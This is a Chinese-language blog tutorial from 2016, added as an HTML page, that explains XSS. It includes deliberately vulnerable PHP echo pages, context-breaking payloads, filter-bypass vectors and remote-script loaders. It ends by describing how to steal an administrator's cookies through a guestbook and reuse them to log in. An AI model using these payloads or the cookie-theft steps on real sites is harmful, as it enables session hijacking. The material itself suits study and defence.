@@ -1,0 +1,1807 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+<title>XSS的原理分析与解剖 - Black-Hole&#39;s Blog</title>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+
+
+    <meta name="description" content="0×01 前言: 《xss攻击手法》一开始在互联网上资料并不多(都是现成的代码，没有从基础的开始)，直到刺的《白帽子讲WEB安全》和cn4rry的《XSS跨站脚本攻击剖析与防御》才开始好转。 我这里就不说什么xss的历史什么东西了，xss是一门又热门又不太受重视的Web攻击手法，为什么会这样呢，原因有下：  耗时间 有一定几率不成功 没有相应的软件来完成自动化攻击 前期需要基本的html、js功">
+<meta name="keywords" content="Web Security,XSS">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS的原理分析与解剖">
+<meta property="og:url" content="http://bugs.cc/2016/05/30/principle-analysis-and-anatomy-of-xss/index.html">
+<meta property="og:site_name" content="Black-Hole&#39;s Blog">
+<meta property="og:description" content="0×01 前言: 《xss攻击手法》一开始在互联网上资料并不多(都是现成的代码，没有从基础的开始)，直到刺的《白帽子讲WEB安全》和cn4rry的《XSS跨站脚本攻击剖析与防御》才开始好转。 我这里就不说什么xss的历史什么东西了，xss是一门又热门又不太受重视的Web攻击手法，为什么会这样呢，原因有下：  耗时间 有一定几率不成功 没有相应的软件来完成自动化攻击 前期需要基本的html、js功">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://i.niupic.com/images/2016/05/30/iK1iNW.png">
+<meta property="og:image" content="https://i.niupic.com/images/2016/05/30/HheYf8.png">
+<meta property="og:image" content="https://i.niupic.com/images/2016/05/30/aSWspi.png">
+<meta property="og:image" content="https://i.niupic.com/images/2016/05/30/cdFv9V.png">
+<meta property="og:image" content="https://i.niupic.com/images/2016/05/30/ImuxHT.png">
+<meta property="og:image" content="https://i.niupic.com/images/2016/05/30/EeVT32.png">
+<meta property="og:image" content="https://i.niupic.com/images/2016/05/30/1h5YdR.png">
+<meta property="og:image" content="https://i.niupic.com/images/2016/05/30/vwP031.png">
+<meta property="og:image" content="https://i.niupic.com/images/2016/05/30/QJtpQo.png">
+<meta property="og:image" content="https://i.niupic.com/images/2016/05/30/UHREw4.png">
+<meta property="og:image" content="https://i.niupic.com/images/2016/05/30/flfTcb.png">
+<meta property="og:image" content="https://i.niupic.com/images/2016/05/30/uvuo5i.png">
+<meta property="og:image" content="https://i.niupic.com/images/2016/05/30/tgdkGA.png">
+<meta property="og:image" content="https://i.niupic.com/images/2016/05/30/gcQF2g.png">
+<meta property="og:image" content="https://i.niupic.com/images/2016/05/30/wq0ht7.png">
+<meta property="og:image" content="https://i.niupic.com/images/2016/05/30/xYdH4Z.png">
+<meta property="og:updated_time" content="2018-12-31T15:11:58.778Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="XSS的原理分析与解剖">
+<meta name="twitter:description" content="0×01 前言: 《xss攻击手法》一开始在互联网上资料并不多(都是现成的代码，没有从基础的开始)，直到刺的《白帽子讲WEB安全》和cn4rry的《XSS跨站脚本攻击剖析与防御》才开始好转。 我这里就不说什么xss的历史什么东西了，xss是一门又热门又不太受重视的Web攻击手法，为什么会这样呢，原因有下：  耗时间 有一定几率不成功 没有相应的软件来完成自动化攻击 前期需要基本的html、js功">
+<meta name="twitter:image" content="https://i.niupic.com/images/2016/05/30/iK1iNW.png">
+<meta name="twitter:creator" content="@Free_BlackHole">
+<meta name="twitter:site" content="https://twitter.com/Free_BlackHole">
+
+
+
+<link rel="alternative" href="/atom.xml" title="XSS的原理分析与解剖" type="application/atom+xml">
+
+
+
+<link rel="icon" href="/images/favicon.ico">
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.7.2/css/bulma.css">
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.4.1/css/all.css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Ubuntu:400,600|Source+Code+Pro">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css">
+
+
+    
+    
+    
+    <style>body>.footer,body>.navbar,body>.section{opacity:0}</style>
+    
+
+    
+    
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css">
+    
+
+    
+    
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.css">
+
+
+    
+    
+    
+    
+
+<link rel="stylesheet" href="/css/back-to-top.css">
+
+
+    
+    
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-90340553-1"></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'UA-90340553-1');
+</script>
+
+
+    
+    
+    
+    
+
+    
+    
+<link rel="stylesheet" href="/css/progressbar.css">
+<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+
+    
+    
+    
+
+    
+
+
+<link rel="stylesheet" href="/css/style.css">
+</head>
+<body class="is-3-column">
+    <nav class="navbar navbar-main">
+    <div class="container">
+        <div class="navbar-brand is-flex-center">
+            <a class="navbar-item navbar-logo" href="/">
+            
+                <img src="/images/logo.png" alt="XSS的原理分析与解剖" height="28">
+            
+            </a>
+        </div>
+        <div class="navbar-menu">
+            
+            <div class="navbar-start">
+                
+                <a class="navbar-item" href="/">Home</a>
+                
+                <a class="navbar-item" href="/archives">Archives</a>
+                
+                <a class="navbar-item" href="/categories">Categories</a>
+                
+                <a class="navbar-item" href="/tags">Tags</a>
+                
+                <a class="navbar-item" href="/friends">Friends</a>
+                
+                <a class="navbar-item" href="/todo">Todo</a>
+                
+                <a class="navbar-item" href="/about">About</a>
+                
+            </div>
+            
+            <div class="navbar-end">
+                
+                    
+                    
+                    <a class="navbar-item" target="_blank" title="GitHub" href="https://github.com/BlackHole1">
+                        
+                        <i class="fab fa-github"></i>
+                        
+                    </a>
+                    
+                
+                
+                
+                <a class="navbar-item search" title="搜索" href="javascript:;">
+                    <i class="fas fa-search"></i>
+                </a>
+                
+            </div>
+        </div>
+    </div>
+</nav>
+    
+    <section class="section">
+        <div class="container">
+            <div class="columns">
+                <div class="column is-8-tablet is-8-desktop is-6-widescreen has-order-2 column-main"><div class="card">
+    
+    <div class="card-image">
+        <span class="image is-7by1">
+            <img class="thumbnail" src="/images/thumbnail/globalworming_42992442_331543194069074_6073178102975632708_n.jpg" alt="XSS的原理分析与解剖">
+        </span>
+    </div>
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2016-05-30T03:27:07.000Z">2016-05-30</time>
+                
+                <div class="level-item">
+                <a class="has-link-grey -link" href="/categories/Web-Security/">Web Security</a>
+                </div>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    16 分钟 读完 (大约 2360 个字)
+                </span>
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                XSS的原理分析与解剖
+            
+        </h1>
+        <div class="content">
+            <blockquote>
+<h3 id="0×01-前言"><a href="#0×01-前言" class="headerlink" title="0×01 前言:"></a>0×01 前言:</h3></blockquote>
+<p>《xss攻击手法》一开始在互联网上资料并不多(都是现成的代码，没有从基础的开始)，直到刺的《白帽子讲WEB安全》和cn4rry的《XSS跨站脚本攻击剖析与防御》才开始好转。</p>
+<p>我这里就不说什么xss的历史什么东西了，xss是一门又热门又不太受重视的Web攻击手法，为什么会这样呢，原因有下：</p>
+<ol>
+<li>耗时间</li>
+<li>有一定几率不成功</li>
+<li>没有相应的软件来完成自动化攻击</li>
+<li>前期需要基本的html、js功底，后期需要扎实的html、js、actionscript2/3.0等语言的功底</li>
+<li>是一种被动的攻击手法</li>
+<li>对website有http-only、crossdomian.xml没有用</li>
+</ol>
+<a id="more"></a>
+<p>但是这些并没有影响黑客对此漏洞的偏爱，原因不需要多，只需要一个“XSS几乎每个网站都存在，google、baidu、360等都存在。”</p>
+<blockquote>
+<h3 id="0x02-原理："><a href="#0x02-原理：" class="headerlink" title="0x02 原理："></a>0x02 原理：</h3></blockquote>
+<p>首先我们现在本地搭建个PHP环境(可以使用phpstudy安装包安装)，然后在index.php文件里写入如下代码:</p>
+<figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><br><span class="line">        &lt;title&gt;XSS原理重现&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;form action=&quot;&quot; method=&quot;get&quot;&gt;</span><br><span class="line">            &lt;input type=&quot;text&quot; name=&quot;xss_input&quot;&gt;</span><br><span class="line">            &lt;input type=&quot;submit&quot;&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">        &lt;hr&gt;</span><br><span class="line">        &lt;?php</span><br><span class="line">        $xss = $_GET[&apos;xss_input&apos;];</span><br><span class="line">        echo &apos;你输入的字符为&lt;br&gt;&apos;.$xss;</span><br><span class="line">        ?&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>然后，你会在页面看到这样的页面</p>
+<p><img src="https://i.niupic.com/images/2016/05/30/iK1iNW.png" alt=""></p>
+<p>我们试着输入abcd123，得到的结果为</p>
+<p><img src="https://i.niupic.com/images/2016/05/30/HheYf8.png" alt=""></p>
+<p>我们在看看源代码</p>
+<p><img src="https://i.niupic.com/images/2016/05/30/aSWspi.png" alt=""></p>
+<p>我们输入的字符串被原封不动的输出来了，那这里我们提出来一个假设，假设我们在搜索框输入<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>会出现什么呢？如果按照上面的例子来说，它应该存在第12行的<code>&lt;br&gt;</code>与<code>&lt;/boby&gt;</code>之间，变成<code>&lt;br&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&lt;/boby&gt;</code>，那应该会弹出对话框。</p>
+<p>既然假设提出来，那我们来实现下这个假设成不成立吧。</p>
+<p>我们输入<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>，得到的页面为</p>
+<p><img src="https://i.niupic.com/images/2016/05/30/cdFv9V.png" alt=""></p>
+<p>成功弹窗，这个时候基本上就可以确定存在xss漏洞。</p>
+<p>我们在看看源代码</p>
+<p><img src="https://i.niupic.com/images/2016/05/30/ImuxHT.png" alt=""></p>
+<p>看来，我们的假设成功了，这节就说说XSS的原理，下面几节说说xss的构造和利用</p>
+<blockquote>
+<h3 id="0×03-xss利用输出的环境来构造代码"><a href="#0×03-xss利用输出的环境来构造代码" class="headerlink" title="0×03 xss利用输出的环境来构造代码:"></a>0×03 xss利用输出的环境来构造代码:</h3></blockquote>
+<p>上节说了xss的原理，但是我们的输出点不一在<code>&lt;br&gt;</code>和<code>&lt;/boby&gt;</code>里，可以出现在html标签的属性里，或者其他标签里面。所以这节很重要，因为不一定 当你输入</p>
+<p><code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>就会弹窗。</p>
+<p>先贴出代码:<br><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><br><span class="line">        &lt;title&gt;XSS利用输出的环境来构造代码&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;center&gt;</span><br><span class="line">            &lt;h6&gt;把我们输入的字符串 输出到input里的value属性里&lt;/h6&gt;</span><br><span class="line">            &lt;form action=&quot;&quot; method=&quot;get&quot;&gt;</span><br><span class="line">                &lt;h6&gt;请输入你想显现的字符串&lt;/h6&gt;</span><br><span class="line">                &lt;input type=&quot;text&quot; name=&quot;xss_input_value&quot; value=&quot;输入&quot;&gt;&lt;br&gt;</span><br><span class="line">                &lt;input type=&quot;submit&quot;&gt;</span><br><span class="line">            &lt;/form&gt;</span><br><span class="line">            &lt;hr&gt;</span><br><span class="line">            &lt;?php</span><br><span class="line">            $xss = $_GET[&apos;xss_input_value&apos;];</span><br><span class="line">            if(isset($xss))&#123;</span><br><span class="line">                echo &apos;&lt;input type=&quot;text&quot; value=&quot;&apos;.$xss.&apos;&quot;&gt;&apos;;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                echo &apos;&lt;input type=&quot;type&quot; value=&quot;输出&quot;&gt;&apos;;</span><br><span class="line">            &#125;</span><br><span class="line">            ?&gt;</span><br><span class="line">        &lt;/center&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
+<p>下面是代码的页面</p>
+<p><img src="https://i.niupic.com/images/2016/05/30/EeVT32.png" alt=""></p>
+<p>这段代码的作用是把第一个输入框的字符串，输出到第二个输入框，我们输入1，那么第二个input里的value值就是1，下面是页面的截图和源代码的截图(这里我输入<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>来测试)</p>
+<p><img src="https://i.niupic.com/images/2016/05/30/1h5YdR.png" alt=""></p>
+<p><img src="https://i.niupic.com/images/2016/05/30/vwP031.png" alt=""></p>
+<p>明显的可以看到，并没有弹出对话框，大家可能会疑惑为什么没有弹窗呢，我们来看看源代码</p>
+<p><img src="https://i.niupic.com/images/2016/05/30/QJtpQo.png" alt=""></p>
+<p>我们看到我们输入的字符串被输出到第15行input标签里的value属性里面，被当成value里的值来显现出来，所以并没有弹窗，这时候我们该怎么办呢？聪明的人已经发现了可以在<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>前面加个<code>&quot;&gt;</code>来闭合input标签。所以应该得到的结果为</p>
+<p><img src="https://i.niupic.com/images/2016/05/30/UHREw4.png" alt=""></p>
+<p>成功弹窗了，我们在看看这时的页面</p>
+<p><img src="https://i.niupic.com/images/2016/05/30/flfTcb.png" alt=""></p>
+<p>看到后面有第二个input输入框后面跟有”&gt;字符串，为什么会这样呢，我们来看看源代码</p>
+<p><img src="https://i.niupic.com/images/2016/05/30/uvuo5i.png" alt=""></p>
+<p>这时可以看到我们构造的代码里面有两个<code>&quot;&gt;</code>，第一个”&gt;是为了闭合input标签，所以第二个<code>&quot;&gt;</code>就被抛弃了，因为html的容错性高，所以并没有像php那样出现错误，而是直接把多余的字符串来输出了，有的人是个完美主义者，不喜欢有多余的字符串被输出，这时该怎么办呢？</p>
+<p>这里我问大家一个问题，我之前说的xss代码里，为什么全是带有标签的。难道就不能不带标签么？！答：当然可以。既然可以不用标签，那我们就用标签里的属性来构造XSS，这样的话，xss代码又少，又不会有多余的字符串被输出来。</p>
+<p>还是这个环境，但是不能使用标签，你应该怎么做。想想input里有什么属性可以调用js，html学的好的人，应该知道了，on事件，对的。我们可以用on事件来进行弹窗，比如这个xss代码 我们可以写成<code>&quot; onclick=&quot;alert(&#39;xss&#39;)</code></p>
+<p>这时，我们在来试试，页面会发生什么样的变化吧。</p>
+<p><img src="https://i.niupic.com/images/2016/05/30/tgdkGA.png" alt=""></p>
+<p>没有看到弹窗啊，失败了么？答案当然是错误的，因为onclick是鼠标点击事件，也就是说当你的鼠标点击第二个input输入框的时候，就会触发onclick事件，然后执行<code>alert(&#39;xss&#39;)</code>代码。我们来试试看</p>
+<p><img src="https://i.niupic.com/images/2016/05/30/gcQF2g.png" alt=""></p>
+<p>当我点击后，就出现了弹窗，这时我们来看看源代码把</p>
+<p><img src="https://i.niupic.com/images/2016/05/30/wq0ht7.png" alt=""></p>
+<p>第15行，value值为空，当鼠标点击时，就会弹出对话框。这里可能就会有人问了，如果要点击才会触发，那不是很麻烦么，成功率不就又下降了么。我来帮你解答这个问题，on事件不止onclick这一个，还有很多，如果你想不需要用户完成什么动作就可以触发的话，i可以把onclick改成</p>
+<ul>
+<li><p>onmousemove 当鼠标移动就触发</p>
+</li>
+<li><p>onload 当页面加载完成后触发</p>
+</li>
+</ul>
+<p>还有很多，我这里就不一一说明了，有兴趣的朋友可以自行查询下。</p>
+<p>别以为就这样结束了，还有一类环境不能用上述的方法，</p>
+<p>那就是如果在<code>&lt;textarea&gt;</code>标签里呢？！或者其他优先级比script高的呢？</p>
+<p>就下面这样</p>
+<p><img src="https://i.niupic.com/images/2016/05/30/xYdH4Z.png" alt=""></p>
+<p>这时我们该怎么办呢？既然前面都说了闭合属性和闭合标签了，那能不能闭合完整的标签呢，答案是肯定的。我们可以输入<code>&lt;/textarea&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>就可以实现弹窗了。</p>
+<blockquote>
+<h3 id="0×04-过滤的解决办法"><a href="#0×04-过滤的解决办法" class="headerlink" title="0×04 过滤的解决办法:"></a>0×04 过滤的解决办法:</h3></blockquote>
+<p>假如说网站禁止过滤了script 这时该怎么办呢，记住一句话，这是我总结出来的“xss就是在页面执行你想要的js”不用管那么多，只要能运行我们的js就OK，比如用img标签或者a标签。我们可以这样写</p>
+<figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">scr</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(</span>'<span class="hljs-attr">xss</span>')&gt;</span> 当找不到图片名为1的文件时，执行alert('xss')</span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">javascrip:alert(</span>'<span class="hljs-attr">xss</span>')&gt;</span>s<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span> 点击s时运行alert('xss')</span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">javascript:alert(</span>'<span class="hljs-attr">xss</span>');<span class="hljs-attr">height</span>=<span class="hljs-string">0</span> <span class="hljs-attr">width</span>=<span class="hljs-string">0</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span>&gt;</span> 利用iframe的scr来弹窗</span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"1"</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">eval(</span>"\<span class="hljs-attr">x61</span>\<span class="hljs-attr">x6c</span>\<span class="hljs-attr">x65</span>\<span class="hljs-attr">x72</span>\<span class="hljs-attr">x74</span>\<span class="hljs-attr">x28</span>\<span class="hljs-attr">x27</span>\<span class="hljs-attr">x78</span>\<span class="hljs-attr">x73</span>\<span class="hljs-attr">x73</span>\<span class="hljs-attr">x27</span>\<span class="hljs-attr">x29</span>")&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">img</span>&gt;</span> 过滤了alert来执行弹窗</span><br></pre></td></tr></table></figure>
+<p>等等有很多的方法，不要把思想总局限于一种上面，记住一句话“xss就是在页面执行你想要的js”其他的管他去。(当然有的时候还要管他…)</p>
+<blockquote>
+<h3 id="0×05-xss的利用"><a href="#0×05-xss的利用" class="headerlink" title="0×05 xss的利用:"></a>0×05 xss的利用:</h3></blockquote>
+<p>说了那么多，大家可能都以为xss就是弹窗，其实错了，弹窗只是测试xss的存在性和使用性。</p>
+<p>这时我们要插入js代码了，怎么插呢？</p>
+<p>你可以这样</p>
+<figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">scr</span>=<span class="hljs-string">"js_url"</span>&gt;</span><span class="hljs-undefined"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>也可以这样<br><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">appendChild(createElement(</span>'<span class="hljs-attr">script</span>'))<span class="hljs-attr">.src</span>=<span class="hljs-string">'js_url'</span> /&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>各种姿势，各种插，只要鞥运行我们的js就OK。那运行我们的js有什么用呢？</p>
+<p>Js可以干很多的事，可以获取cookies(对http-only没用)、控制用户的动作(发帖、私信什么的)等等。</p>
+<p>比如我们在网站的留言区输入<code>&lt;script scr=&quot;js_url&quot;&gt;&lt;/script&gt;</code>当管理员进后台浏览留言的时候，就会触发，然后管理员的cookies和后台地址还有管理员浏览器版本等等你都可以获取到了，再用“桂林老兵cookie欺骗工具”来更改你的cookies，就可以不用输入账号 密码 验证码 就可以以管理员的方式来进行登录了。</p>
+<p>至于不会js的怎么写js代码呢，放心网上有很多xss平台，百度一下就可以看到了。页面是傻瓜式的操作，这里就不再过多的说明了。</p>
+<hr>
+<h4 id="作者信息："><a href="#作者信息：" class="headerlink" title="作者信息："></a><code>作者信息：</code></h4><blockquote>
+<p>Author:Black-Hole</p>
+</blockquote>
+<blockquote>
+<p>Blog:<a href="http://bugs.cc/">http://bugs.cc/</a></p>
+</blockquote>
+<blockquote>
+<p>github:<a href="https://github.com/BlackHole1/" target="_blank" rel="noopener">https://github.com/BlackHole1/</a></p>
+</blockquote>
+<blockquote>
+<p>Twitter:<a href="https://twitter.com/Free_BlackHole" target="_blank" rel="noopener">https://twitter.com/Free_BlackHole</a></p>
+</blockquote>
+<blockquote>
+<p>Email:<a href="mailto:158blackhole@gmail.com" target="_blank" rel="noopener">158blackhole@gmail.com</a></p>
+</blockquote>
+
+        </div>
+        
+        <div class="level is-size-7 is-uppercase">
+            <div class="level-start">
+                <div class="level-item">
+                    <span class="is-size-6 has-text-grey has-mr-7">#</span>
+                    <a class="has-link-grey -link" href="/tags/Web-Security/">Web Security</a>, <a class="has-link-grey -link" href="/tags/XSS/">XSS</a>
+                </div>
+            </div>
+        </div>
+        
+        
+        
+        
+<div class="sharethis-inline-share-buttons"></div>
+<script type="text/javascript" src="//platform-api.sharethis.com/js/sharethis.js#property=5c2a1d4fd02b6e0010eca6e3&amp;product=sticky-share-buttons" async="async"></script>
+
+        
+    </div>
+</div>
+
+
+
+<div class="card">
+    <div class="card-content">
+        <h3 class="menu-label has-text-centered">喜欢这篇文章？打赏一下作者吧</h3>
+        <div class="buttons is-centered">
+            
+                
+<a class="button is-info donate">
+    <span class="icon is-small">
+        <i class="fab fa-alipay"></i>
+    </span>
+    <span>支付宝</span>
+    <div class="qrcode"><img src="/images/alipay.jpg" alt="支付宝"></div>
+</a>
+
+                
+                
+<a class="button is-success donate">
+    <span class="icon is-small">
+        <i class="fab fa-weixin"></i>
+    </span>
+    <span>微信</span>
+    <div class="qrcode"><img src="/images/wechat.jpg" alt="微信"></div>
+</a>
+
+                
+                <!-- Visit https://www.paypal.com/donate/buttons/ to get your donate button -->
+
+<a class="button is-warning donate" onclick="document.getElementById(&#39;paypal-donate-form&#39;).submit()">
+    <span class="icon is-small">
+        <i class="fab fa-paypal"></i>
+    </span>
+    <span>Paypal</span>
+</a>
+<form action="https://www.paypal.com/cgi-bin/webscr" method="post" target="_blank" id="paypal-donate-form">
+    <input type="hidden" name="cmd" value="_donations">
+    <input type="hidden" name="business" value="158blackhole@gmail.com">
+    <input type="hidden" name="currency_code" value="USD">
+</form>
+
+                
+        </div>
+    </div>
+</div>
+
+
+
+<div class="card card-transparent">
+    <div class="level post-navigation is-flex-wrap is-mobile">
+        
+        <div class="level-start">
+            <a class="level level-item has-link-grey  article-nav-prev" href="/2016/06/15/automated-detection-of-CSRF/">
+                <i class="level-item fas fa-chevron-left"></i>
+                <span class="level-item">自动化检测CSRF</span>
+            </a>
+        </div>
+        
+        
+    </div>
+</div>
+
+
+
+<div class="card">
+    <div class="card-content">
+        <h3 class="title is-5 has-text-weight-normal">评论</h3>
+        
+<script>
+    var disqus_config = function () {
+        this.page.url = 'http://bugs.cc/2016/05/30/principle-analysis-and-anatomy-of-xss/';
+        this.page.identifier = '2016/05/30/principle-analysis-and-anatomy-of-xss/';
+    };
+    (function() {
+        var d = document, s = d.createElement('script');  
+        s.src = '//' + 'blackhole-1' + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+
+<div id="disqus_thread">
+    
+    <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+    </div>
+</div>
+</div>
+                
+
+
+
+
+<div class="column is-4-tablet is-4-desktop is-3-widescreen  has-order-1 column-left ">
+    
+        
+<div class="card widget">
+    <div class="card-content">
+        <nav class="level">
+            <div class="level-item has-text-centered">
+                <div>
+                    <img class="image is-128x128 has-mb-6" style="border-radius: 290486px;" src="/images/avatar.png" alt="Black-Hole">
+                    
+                    <p class="is-size-4 is-block">
+                        Black-Hole
+                    </p>
+                    
+                    
+                    <p class="is-size-6 is-block">
+                        一只已经结束异地恋的前端恋爱狗
+                    </p>
+                    
+                    
+                    <p class="is-size-6 is-flex is-flex-center has-text-grey">
+                        <i class="fas fa-map-marker-alt has-mr-7"></i>
+                        <span>ShangHai</span>
+                    </p>
+                    
+                </div>
+            </div>
+        </nav>
+        <nav class="level is-mobile">
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        文章
+                    </p>
+                    <p class="title has-text-weight-normal">
+                        17
+                    </p>
+                </div>
+            </div>
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        分类
+                    </p>
+                    <p class="title has-text-weight-normal">
+                        8
+                    </p>
+                </div>
+            </div>
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        标签
+                    </p>
+                    <p class="title has-text-weight-normal">
+                        21
+                    </p>
+                </div>
+            </div>
+        </nav>
+        <div class="level">
+            <a class="level-item button is-link is-rounded" href="https://github.com/BlackHole1">
+                关注我</a>
+        </div>
+        
+        
+        <div class="level is-mobile">
+            
+            <a class="level-item button is-white is-marginless" target="_blank" title="Github" href="https://github.com/BlackHole1">
+                
+                <i class="fab fa-github"></i>
+                
+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank" title="Weibo" href="http://weibo.com/comelove">
+                
+                <i class="fab fa-weibo"></i>
+                
+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank" title="Twitter" href="https://twitter.com/Free_BlackHole">
+                
+                <i class="fab fa-twitter"></i>
+                
+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank" title="Npm" href="https://www.npmjs.com/~black_hole">
+                
+                <i class="fab fa-npm"></i>
+                
+            </a>
+            
+        </div>
+        
+    </div>
+</div>
+    
+        
+    
+        
+
+<div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+        <h3 class="menu-label">
+            链接
+        </h3>
+        <ul class="menu-list">
+        
+            <li>
+                <a class="level is-mobile" href="https://github.com/alo7" target="_blank">
+                    <span class="level-left">
+                        <span class="level-item">Alo7 Inc</span>
+                    </span>
+                    <span class="level-right">
+                        <span class="level-item tag">github.com</span>
+                    </span>
+                </a>
+            </li>
+        
+            <li>
+                <a class="level is-mobile" href="https://github.com/Web-Security-Automation" target="_blank">
+                    <span class="level-left">
+                        <span class="level-item">Web Security Automation</span>
+                    </span>
+                    <span class="level-right">
+                        <span class="level-item tag">github.com</span>
+                    </span>
+                </a>
+            </li>
+        
+            <li>
+                <a class="level is-mobile" href="https://github.com/Calibre-Node" target="_blank">
+                    <span class="level-left">
+                        <span class="level-item">Calibre Node</span>
+                    </span>
+                    <span class="level-right">
+                        <span class="level-item tag">github.com</span>
+                    </span>
+                </a>
+            </li>
+        
+            <li>
+                <a class="level is-mobile" href="https://github.com/proxyee-down-org" target="_blank">
+                    <span class="level-left">
+                        <span class="level-item">Proxyee Down Org</span>
+                    </span>
+                    <span class="level-right">
+                        <span class="level-item tag">github.com</span>
+                    </span>
+                </a>
+            </li>
+        
+            <li>
